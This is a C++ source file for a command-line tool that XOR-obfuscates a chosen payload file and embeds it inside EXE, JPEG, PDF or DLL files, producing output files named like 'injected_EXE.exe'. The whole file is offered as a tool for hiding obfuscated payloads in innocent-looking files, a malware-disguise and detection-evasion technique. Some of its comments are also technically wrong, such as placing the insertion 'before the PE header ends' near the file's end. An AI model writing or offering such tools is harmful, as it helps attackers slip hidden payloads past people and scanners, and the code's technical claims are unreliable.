#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <sstream>
#include <cctype>
#include <cstring>

// Function to XOR encrypt data
std::vector<char> xorEncrypt(const std::vector<char>& data, char key) {
    std::vector<char> encryptedData;
    for (char byte : data) {
        encryptedData.push_back(byte ^ key);
    }
    return encryptedData;
}

// Function to inject payload into an EXE file
void injectPayloadIntoEXE(const std::string& targetFile, const std::string& payloadFile, char key) {
    std::ifstream target(targetFile, std::ios::binary);
    std::ofstream output("injected_EXE.exe", std::ios::binary);

    if (!target || !output) {
        std::cerr << "Error opening target file for injection." << std::endl;
        return;
    }

    // Read the entire target EXE file
    std::vector<char> targetData((std::istreambuf_iterator<char>(target)), std::istreambuf_iterator<char>());

    // Read the payload file
    std::ifstream payload(payloadFile, std::ios::binary);
    std::vector<char> payloadData((std::istreambuf_iterator<char>(payload)), std::istreambuf_iterator<char>());

    // Obfuscate the payload
    payloadData = xorEncrypt(payloadData, key);

    // Insert payload before the end of the target EXE (before the PE header ends)
    size_t targetSize = targetData.size();
    size_t insertPosition = targetSize - 4; // Just before the last 4 bytes

    // Write the data before the injection point
    output.write(targetData.data(), insertPosition);

    // Inject the payload
    output.write(payloadData.data(), payloadData.size());

    // Write the remaining data after the injection point
    output.write(targetData.data() + insertPosition, targetSize - insertPosition);

    std::cout << "Payload injected into EXE successfully." << std::endl;
}

// Function to inject payload into a JPEG file
void injectPayloadIntoJPEG(const std::string& targetFile, const std::string& payloadFile, char key) {
    std::ifstream target(targetFile, std::ios::binary);
    std::ofstream output("injected_JPEG.jpg", std::ios::binary);

    if (!target || !output) {
        std::cerr << "Error opening target file for injection." << std::endl;
        return;
    }

    // Read the entire target JPEG file
    std::vector<char> targetData((std::istreambuf_iterator<char>(target)), std::istreambuf_iterator<char>());

    // Read the payload file
    std::ifstream payload(payloadFile, std::ios::binary);
    std::vector<char> payloadData((std::istreambuf_iterator<char>(payload)), std::istreambuf_iterator<char>());

    // Obfuscate the payload
    payloadData = xorEncrypt(payloadData, key);

    // Find the JPEG EOI marker (FFD9) to insert the payload before it
    size_t markerPos = targetData.size() - 2;
    while (markerPos > 0 && (targetData[markerPos] != (char)0xFF || targetData[markerPos + 1] != (char)0xD9)) {
        markerPos--;
    }

    if (markerPos == 0) {
        std::cerr << "JPEG file format invalid or no EOI marker found." << std::endl;
        return;
    }

    // Write data before the EOI marker
    output.write(targetData.data(), markerPos);

    // Inject the payload
    output.write(payloadData.data(), payloadData.size());

    // Write data after the EOI marker
    output.write(targetData.data() + markerPos, targetData.size() - markerPos);

    std::cout << "Payload injected into JPEG successfully." << std::endl;
}

// Function to inject payload into a PDF file
void injectPayloadIntoPDF(const std::string& targetFile, const std::string& payloadFile, char key) {
    std::ifstream target(targetFile, std::ios::binary);
    std::ofstream output("injected_PDF.pdf", std::ios::binary);

    if (!target || !output) {
        std::cerr << "Error opening target file for injection." << std::endl;
        return;
    }

    // Read the entire target PDF file
    std::vector<char> targetData((std::istreambuf_iterator<char>(target)), std::istreambuf_iterator<char>());

    // Read the payload file
    std::ifstream payload(payloadFile, std::ios::binary);
    std::vector<char> payloadData((std::istreambuf_iterator<char>(payload)), std::istreambuf_iterator<char>());

    // Obfuscate the payload
    payloadData = xorEncrypt(payloadData, key);

    // Insert payload at the end of the PDF
    output.write(targetData.data(), targetData.size());
    output.write(payloadData.data(), payloadData.size());

    std::cout << "Payload injected into PDF successfully." << std::endl;
}

// Function to inject payload into a DLL file
void injectPayloadIntoDLL(const std::string& targetFile, const std::string& payloadFile, char key) {
    std::ifstream target(targetFile, std::ios::binary);
    std::ofstream output("injected_DLL.dll", std::ios::binary);

    if (!target || !output) {
        std::cerr << "Error opening target file for injection." << std::endl;
        return;
    }

    // Read the entire target DLL file
    std::vector<char> targetData((std::istreambuf_iterator<char>(target)), std::istreambuf_iterator<char>());

    // Read the payload file
    std::ifstream payload(payloadFile, std::ios::binary);
    std::vector<char> payloadData((std::istreambuf_iterator<char>(payload)), std::istreambuf_iterator<char>());

    // Obfuscate the payload
    payloadData = xorEncrypt(payloadData, key);

    // Insert payload into a suitable location (for simplicity, insert before the end)
    size_t targetSize = targetData.size();
    size_t insertPosition = targetSize - 4;

    // Write the data before the injection point
    output.write(targetData.data(), insertPosition);

    // Inject the payload
    output.write(payloadData.data(), payloadData.size());

    // Write the remaining data after the injection point
    output.write(targetData.data() + insertPosition, targetSize - insertPosition);

    std::cout << "Payload injected into DLL successfully." << std::endl;
}

int main() {
    std::string targetFile, payloadFile;
    char fileType;
    char key = 'K'; // Simple encryption key (this can be dynamic)

    // Get file type from user
    std::cout << "Enter target file type (E - EXE, J - JPEG, P - PDF, D - DLL): ";
    std::cin >> fileType;

    // Get target file and payload file from user
    std::cout << "Enter target file name: ";
    std::cin >> targetFile;
    std::cout << "Enter payload file name: ";
    std::cin >> payloadFile;

    // Inject payload based on file type
    if (fileType == 'E' || fileType == 'e') {
        injectPayloadIntoEXE(targetFile, payloadFile, key);
    } else if (fileType == 'J' || fileType == 'j') {
        injectPayloadIntoJPEG(targetFile, payloadFile, key);
    } else if (fileType == 'P' || fileType == 'p') {
        injectPayloadIntoPDF(targetFile, payloadFile, key);
    } else if (fileType == 'D' || fileType == 'd') {
        injectPayloadIntoDLL(targetFile, payloadFile, key);
    } else {
        std::cerr << "Invalid file type." << std::endl;
    }

    return 0;
}

